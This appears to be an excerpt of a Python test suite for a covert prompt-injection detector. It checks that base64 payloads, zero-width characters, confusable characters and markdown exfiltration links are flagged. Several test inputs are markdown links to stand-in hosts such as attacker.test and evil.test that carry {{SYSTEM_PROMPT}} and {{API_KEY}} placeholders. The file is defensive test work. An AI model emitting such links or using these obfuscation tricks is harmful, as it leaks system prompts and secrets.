...
class TestCovertInjectionDetector:
    ...
    def test_base64_payload_detection_malicious(self):
        ...
        processed_input = self.create_processed_input(
            original_text=input_text, detected_encodings=["base64"]
        )
        ...
        assert any(
            "Base64 payload detected" in evidence for evidence in result.evidence
        )
    ...
    def test_base64_payload_no_encoding_detected(self):
        ...
        processed_input = self.create_processed_input(
            original_text=input_text, detected_encodings=[]
        )
    ...
    def test_zero_width_obfuscation_detection(self):
        ...
        assert result.suggested_action == SecurityAction.FLAG
        assert any(
            "Zero-width characters detected" in evidence for evidence in result.evidence
        )
    ...
    def test_zero_width_obfuscation_multiple_chars(self):
        ...
        assert result.matched_patterns[0].id == "PAT-019"
        assert any(
            "7 characters" in evidence for evidence in result.evidence
        )  # Count of ZWC
    ...
    def test_zero_width_obfuscation_no_removal(self):
        ...
        processed_input = self.create_processed_input(
            original_text=input_text, zero_width_chars_removed=False
        )
    ...
    def test_markdown_exfiltration_template_variables(self):
        ...
        input_text = (
            "Click here: [click me](http://attacker.test/leak?key={{SYSTEM_PROMPT}})"
        )
    ...
    def test_markdown_exfiltration_suspicious_params(self):
        ...
        input_text = (
            "Check this: [help](http://example.com/api?system_prompt=value&config=data)"
        )
        processed_input = self.create_processed_input(original_text=input_text)
        ...
        assert result.matched_patterns[0].id == "PAT-020"
        assert any(
            "suspicious parameter: system_prompt" in evidence
    ...
    def test_markdown_exfiltration_multiple_issues(self):
        ...
        input_text = (
            "Malicious: [steal](http://evil.test/exfil?token={{API_KEY}}&secret=data)"
        )
        processed_input = self.create_processed_input(original_text=input_text)
        ...
        assert any("template variables" in evidence for evidence in result.evidence)
        assert any(
            "suspicious domain: evil" in evidence for evidence in result.evidence
        )

    def test_markdown_exfiltration_benign_links(self):
        """Test that benign markdown links are not flagged."""
        input_text = (
            "See documentation: [GitHub](https://github.com/user/repo) for more info"
        )
        processed_input = self.create_processed_input(original_text=input_text)
    ...
    def test_confusable_characters_no_normalization(self):
        ...
        processed_input = self.create_processed_input(
            original_text=input_text, confusable_chars_normalized=False
        )
    ...
    def test_multiple_covert_attacks_combined(self):
        ...
        malicious_base64 = base64.b64encode(
        ...
        assert (
            "PAT-018" in pattern_ids
            or "PAT-019" in pattern_ids
            or "PAT-020" in pattern_ids
            or "PAT-021" in pattern_ids
        )
